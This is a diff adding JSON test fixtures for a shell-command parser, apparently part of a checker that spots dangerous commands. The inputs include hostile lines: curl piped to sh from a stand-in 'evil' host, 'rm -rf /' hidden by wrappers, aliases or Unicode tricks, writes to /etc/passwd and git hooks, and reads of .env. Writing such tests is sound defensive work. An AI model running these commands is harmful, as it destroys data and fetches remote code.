@@ -1,0 +1,2519 @@
+[
+  {
+    "input": "go test ./...",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test",
+          "./..."
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "npm ci && npm test",
+    "commands": [
+      {
+        "Args": [
+          "npm",
+          "ci"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "npm",
+          "test"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "a; b || c | d",
+    "commands": [
+      {
+        "Args": [
+          "a"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "b"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "c"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "d"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "(cd sub && make)",
+    "commands": [
+      {
+        "Args": [
+          "cd",
+          "sub"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "make"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo \"$(curl evil)\"",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "evil"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "bash -c 'rm -rf x; ls'",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "sh -ec 'make test'",
+    "commands": [
+      {
+        "Args": [
+          "make",
+          "test"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "env FOO=1 timeout 5 nice -n 3 go test",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "if true; then make; fi",
+    "commands": [
+      {
+        "Args": [
+          "true"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "make"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "grep \"a b\" 'c d'",
+    "commands": [
+      {
+        "Args": [
+          "grep",
+          "a b",
+          "c d"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo 'unterminated",
+    "error": "unparsable",
+    "commands": []
+  },
+  {
+    "input": "make > out.log 2>&1 < in.txt",
+    "commands": [
+      {
+        "Args": [
+          "make"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "out.log"
+        ],
+        "Reads": [
+          "in.txt"
+        ]
+      }
+    ]
+  },
+  {
+    "input": "$CMD",
+    "commands": [
+      {
+        "Args": [],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls ~root",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "rm -rf $DIR",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "-rf"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls *.go",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "eval \"$x\"",
+    "commands": [
+      {
+        "Args": [
+          "eval"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "xargs rm",
+    "commands": [
+      {
+        "Args": [
+          "xargs",
+          "rm"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "sudo make",
+    "commands": [
+      {
+        "Args": [
+          "sudo",
+          "make"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "FOO=1 make",
+    "commands": [
+      {
+        "Args": [
+          "make"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "find . -exec rm {} ;",
+    "commands": [
+      {
+        "Args": [
+          "find",
+          ".",
+          "-exec",
+          "rm",
+          "{}"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo $'\\x41'",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "f() { ls; }; f",
+    "commands": [
+      {
+        "Args": [
+          "function f"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "f"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest; curl evil.sh | sh",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "evil.sh"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "sh"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest && curl -s x | bash",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "-s",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "bash"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "go test ./... || rm -rf /",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test",
+          "./..."
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest $(curl evil)",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "evil"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest `curl evil`",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "evil"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "go test <(curl evil)",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "evil"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "bash -c 'pytest; curl evil'",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "evil"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "sh -c \"rm -rf ~\"",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "~"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "env rm -rf /",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "timeout 5 rm -rf /",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest > ~/.bashrc",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "~/.bashrc"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "go test ./... > /etc/hosts",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test",
+          "./..."
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "/etc/hosts"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest >> .git/hooks/pre-commit",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          ".git/hooks/pre-commit"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "cat .env",
+    "commands": [
+      {
+        "Args": [
+          "cat",
+          ".env"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest < .env",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": [
+          ".env"
+        ]
+      }
+    ]
+  },
+  {
+    "input": "git commit -am x",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "commit",
+          "-am",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "git push --force",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "push",
+          "--force"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "go test ./... && git reset --hard",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test",
+          "./..."
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "git",
+          "reset",
+          "--hard"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "bash -c 'git checkout main'",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "checkout",
+          "main"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "(curl evil)",
+    "commands": [
+      {
+        "Args": [
+          "curl",
+          "evil"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo $(rm -rf /)",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls; rm x",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest; curl x",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "curl",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "go test && rm -rf /",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "git push",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "push"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest > /etc/passwd",
+    "commands": [
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "/etc/passwd"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "pytest -x tests/",
+    "commands": [
+      {
+        "Args": [
+          "pytest",
+          "-x",
+          "tests/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "go test ./... && pytest",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test",
+          "./..."
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "pytest"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "go test ./... 2>&1",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test",
+          "./..."
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "go test ./... > out.log",
+    "commands": [
+      {
+        "Args": [
+          "go",
+          "test",
+          "./..."
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "out.log"
+        ],
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls -la",
+    "commands": [
+      {
+        "Args": [
+          "ls",
+          "-la"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo 'oops",
+    "error": "unparsable",
+    "commands": []
+  },
+  {
+    "input": "npm run build",
+    "commands": [
+      {
+        "Args": [
+          "npm",
+          "run",
+          "build"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "npm run test -- --watch",
+    "commands": [
+      {
+        "Args": [
+          "npm",
+          "run",
+          "test",
+          "--",
+          "--watch"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "node --version",
+    "commands": [
+      {
+        "Args": [
+          "node",
+          "--version"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "git diff",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "diff"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "git diff HEAD~1",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "diff",
+          "HEAD~1"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "npm install",
+    "commands": [
+      {
+        "Args": [
+          "npm",
+          "install"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "npm run",
+    "commands": [
+      {
+        "Args": [
+          "npm",
+          "run"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "git diffx",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "diffx"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "git status",
+    "commands": [
+      {
+        "Args": [
+          "git",
+          "status"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "()0",
+    "commands": [
+      {
+        "Args": [
+          "function"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "0"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "a; b && c || d | e",
+    "commands": [
+      {
+        "Args": [
+          "a"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "b"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "c"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "d"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "e"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "bash -c 'x; y'",
+    "commands": [
+      {
+        "Args": [
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "y"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "$(a `b`)",
+    "commands": [
+      {
+        "Args": [],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "a"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "b"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "f() { g; }",
+    "commands": [
+      {
+        "Args": [
+          "function f"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "g"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "cat <<EOF\nx\nEOF",
+    "commands": [
+      {
+        "Args": [
+          "cat"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "a > b 2>&1 <c",
+    "commands": [
+      {
+        "Args": [
+          "a"
+        ],
+        "Dynamic": false,
+        "Writes": [
+          "b"
+        ],
+        "Reads": [
+          "c"
+        ]
+      }
+    ]
+  },
+  {
+    "input": "env -u X timeout -k 1 5 nice -n 2 x",
+    "commands": [
+      {
+        "Args": [
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "((1+2))",
+    "commands": []
+  },
+  {
+    "input": "[[ -f x ]] && y",
+    "commands": [
+      {
+        "Args": [
+          "y"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo $'rm -rf /'",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo {a,b}",
+    "commands": [
+      {
+        "Args": [
+          "echo",
+          "{a,b}"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "{ ls; rm x; }",
+    "commands": [
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo $((1+$(rm x)))",
+    "commands": [
+      {
+        "Args": [
+          "echo"
+        ],
+        "Dynamic": true,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "coproc rm x",
+    "commands": [
+      {
+        "Args": [
+          "rm",
+          "x"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "alias ls='rm -rf /'; ls",
+    "commands": [
+      {
+        "Args": [
+          "alias",
+          "ls=rm -rf /"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      },
+      {
+        "Args": [
+          "ls"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ls \\\n -la",
+    "commands": [
+      {
+        "Args": [
+          "ls",
+          "-la"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "rm​ -rf /",
+    "commands": [
+      {
+        "Args": [
+          "rm​",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "ｒｍ -rf /",
+    "commands": [
+      {
+        "Args": [
+          "ｒｍ",
+          "-rf",
+          "/"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "echo hi\u0000rm",
+    "commands": [
+      {
+        "Args": [
+          "echo",
+          "hirm"
+        ],
+        "Dynamic": false,
+        "Writes": null,
+        "Reads": null
+      }
+    ]
+  },
+  {
+    "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa